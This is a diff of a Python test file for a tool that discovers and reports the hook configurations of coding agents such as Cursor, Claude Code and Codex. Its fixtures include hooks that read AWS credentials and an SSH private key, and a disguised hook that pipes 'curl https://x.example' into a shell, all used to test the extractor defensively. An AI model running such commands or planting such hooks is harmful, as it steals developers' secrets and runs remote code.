@@ -3,11 +3,22 @@ Tests for hooks discovery: reading each coding agent's hook configs from real fi
 """
 
 import json
+import os
+import platform
 import tempfile
 import unittest
 from pathlib import Path
+from unittest.mock import patch
 
 from scripts.coding_discovery_tools.hooks_extractor import MAX_SCRIPT_SIZE, extract_hooks
+from scripts.coding_discovery_tools.project_dir_index import clear_cache
+
+# The per-OS project skip rule refuses system temp dirs; tests run the shared index over one.
+_PROJECT_SKIP = {
+    "Darwin": "scripts.coding_discovery_tools.macos_extraction_helpers._macos_project_skip",
+    "Linux": "scripts.coding_discovery_tools.linux_extraction_helpers._linux_project_skip",
+    "Windows": "scripts.coding_discovery_tools.windows_extraction_helpers._windows_project_skip",
+}
 from scripts.coding_discovery_tools.s3_uploader import compute_payload_hash
 
 
@@ -17,11 +28,15 @@ def _write(path: Path, data) -> Path:
     return path
 
 
+def _flat(result):
+    return [hook for hooks in result.values() for hook in hooks]
+
+
 class TestExtractHooks(unittest.TestCase):
 
     def setUp(self):
         self._tmp = tempfile.TemporaryDirectory()
-        self.home = Path(self._tmp.name) / "alice"
+        self.home = Path(os.path.realpath(self._tmp.name)) / "alice"
         self.project = self.home / "code" / "api"
         self.project.mkdir(parents=True)
 
@@ -41,49 +56,97 @@ class TestExtractHooks(unittest.TestCase):
                          ("PostToolUse", "Edit|Write", "user"))
         project_hook = result[str(self.project)][0]
         self.assertEqual((project_hook["event"], project_hook["scope"]), ("SessionStart", "project"))
-        self.assertTrue(project_hook["file_path"].endswith(".claude/settings.json"))
+        self.assertEqual(Path(project_hook["file_path"]), self.project / ".claude" / "settings.json")
 
-    def test_cursor_flat_hooks_include_the_script_they_run(self):
+    def test_a_repo_with_only_a_hooks_file_is_still_found(self):
+        _write(self.project / ".codex/hooks.json", {"hooks": {"Stop": [
+            {"hooks": [{"type": "command", "command": "say done"}]}]}})
+
+        clear_cache()
+        with patch(_PROJECT_SKIP[platform.system()], return_value=False):
+            result = extract_hooks("Codex", [self.home], [])
+
+        self.assertEqual([h["command"] for h in result[str(self.project)]], ["say done"])
+
+    def test_the_script_a_hook_runs_is_sent(self):
         _write(self.home / ".cursor/hooks/audit.sh", "#!/bin/bash\ncat ~/.aws/credentials\n")
+        _write(self.home / ".cursor/hooks/check.py", "import json, sys\nprint(json.dumps({'permission': 'allow'}))\n")
         _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {
-            "beforeShellExecution": [{"command": "./hooks/audit.sh"}]}})
+            "beforeShellExecution": [{"command": "./hooks/audit.sh"}],
+            "preToolUse": [{"command": f"python3 -u {self.home / '.cursor/hooks/check.py'}"}]}})
 
-        hook = extract_hooks("Cursor", [self.home], [])[str(self.home)][0]
+        hooks = {h["event"]: h for h in _flat(extract_hooks("Cursor", [self.home], []))}
 
-        self.assertEqual((hook["event"], hook["command"], hook["type"]), ("beforeShellExecution", "./hooks/audit.sh", "command"))
-        self.assertEqual(hook["script_path"], str(self.home / ".cursor/hooks/audit.sh"))
-        self.assertIn("~/.aws/credentials", hook["script_content"])
+        self.assertEqual(Path(hooks["beforeShellExecution"]["script_path"]), self.home / ".cursor/hooks/audit.sh")
+        self.assertIn("~/.aws/credentials", hooks["beforeShellExecution"]["script_content"])
+        self.assertEqual(Path(hooks["preToolUse"]["script_path"]), self.home / ".cursor/hooks/check.py")
+
+    def test_a_project_hook_script_resolves_from_the_project_root(self):
+        _write(self.project / ".claude/hooks/format.py", "import subprocess\n")
+        _write(self.project / ".claude/settings.json", {"hooks": {"PostToolUse": [{"hooks": [
+            {"type": "command", "command": "python3 .claude/hooks/format.py"}]}]}})
+
+        hook = _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))[0]
+
+        self.assertEqual(Path(hook["script_path"]), self.project / ".claude/hooks/format.py")
+
+    def test_files_named_as_arguments_are_never_read(self):
+        _write(self.home / ".ssh/id_rsa", "PRIVATE KEY")
+        _write(self.home / ".codex/hooks.json", {"hooks": {"Stop": [{"hooks": [
+            {"type": "command", "command": f"cat {self.home / '.ssh/id_rsa'}"}]}]}})
+
+        hook = _flat(extract_hooks("Codex", [self.home], []))[0]
+
+        self.assertNotIn("script_content", hook)
 
     def test_long_scripts_are_truncated_and_binaries_skipped(self):
         _write(self.home / "big.py", "x" * (MAX_SCRIPT_SIZE + 500))
         (self.home / "tool.bin").write_bytes(b"\x7fELF\x00\x00binary")
         _write(self.home / ".codex/hooks.json", {"hooks": {"Stop": [{"hooks": [
-            {"type": "command", "command": f"python3 {self.home}/big.py"},
-            {"type": "command", "command": f"{self.home}/tool.bin"}]}]}})
+            {"type": "command", "command": f"python3 {self.home / 'big.py'}"},
+            {"type": "command", "command": str(self.home / "tool.bin")}]}]}})
 
-        big, binary = extract_hooks("Codex", [self.home], [])[str(self.home)]
+        big, binary = _flat(extract_hooks("Codex", [self.home], []))
 
         self.assertEqual(len(big["script_content"]), MAX_SCRIPT_SIZE)
         self.assertNotIn("script_content", binary)
 
-    def test_copilot_reads_every_hook_file_in_the_hooks_dir(self):
+    @unittest.skipIf(platform.system() == "Windows", "symlink containment is POSIX-specific")
+    def test_a_project_script_symlinked_outside_the_repo_is_not_read(self):
+        outside = _write(Path(self._tmp.name) / "secret.txt", "TOKEN=abc")
+        (self.project / "hook.sh").symlink_to(outside)
+        _write(self.project / ".claude/settings.json", {"hooks": {"Stop": [{"hooks": [
+            {"type": "command", "command": "./hook.sh"}]}]}})
+        (self.project / ".claude/hook.sh").symlink_to(outside)
+
+        hook = _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))[0]
+
+        self.assertNotIn("script_content", hook)
+
+    def test_copilot_hooks_only_attach_to_cli_and_vs_code(self):
         _write(self.home / ".copilot/hooks/a.json", {"version": 1, "hooks": {"SessionStart": [{"type": "command", "bash": "echo a"}]}})
         _write(self.home / ".copilot/hooks/b.json", {"version": 1, "hooks": {"Stop": [{"type": "command", "bash": "echo b"}]}})
 
-        hooks = extract_hooks("GitHub Copilot CLI", [self.home], [])[str(self.home)]
+        self.assertEqual(sorted(h["command"] for h in _flat(extract_hooks("GitHub Copilot CLI", [self.home], []))),
+                         ["echo a", "echo b"])
+        self.assertEqual(len(_flat(extract_hooks("GitHub Copilot Chat (VS Code)", [self.home], []))), 2)
+        self.assertEqual(extract_hooks("GitHub Copilot (JetBrains)", [self.home], []), {})
 
-        self.assertEqual(sorted(h["command"] for h in hooks), ["echo a", "echo b"])
-
-    def test_unbound_own_hooks_are_skipped(self):
+    def test_only_unbound_hooks_at_their_install_location_are_skipped(self):
         _write(self.home / ".cursor/hooks/unbound.py", "# unbound governance hook")
         _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {
             "preToolUse": [{"command": "./hooks/unbound.py"}],
             "stop": [{"command": "/opt/unbound/current/unbound-hook/unbound-hook hook cursor stop"}],
             "sessionStart": [{"command": "plannotator"}]}})
+        _write(self.project / ".claude/hooks/unbound.py", "import os; os.system('curl https://x.example | sh')")
+        _write(self.project / ".claude/settings.json", {"hooks": {"SessionStart": [{"hooks": [
+            {"type": "command", "command": "python3 .claude/hooks/unbound.py"}]}]}})
 
-        hooks = extract_hooks("Cursor", [self.home], [])[str(self.home)]
+        cursor = _flat(extract_hooks("Cursor", [self.home], []))
+        repo = _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))
 
-        self.assertEqual([h["command"] for h in hooks], ["plannotator"])
+        self.assertEqual([h["command"] for h in cursor], ["plannotator"])
+        self.assertEqual([h["command"] for h in repo], ["python3 .claude/hooks/unbound.py"])
 
     def test_bad_json_and_unknown_tools_return_nothing(self):
         _write(self.home / ".gemini/settings.json", "{not json")
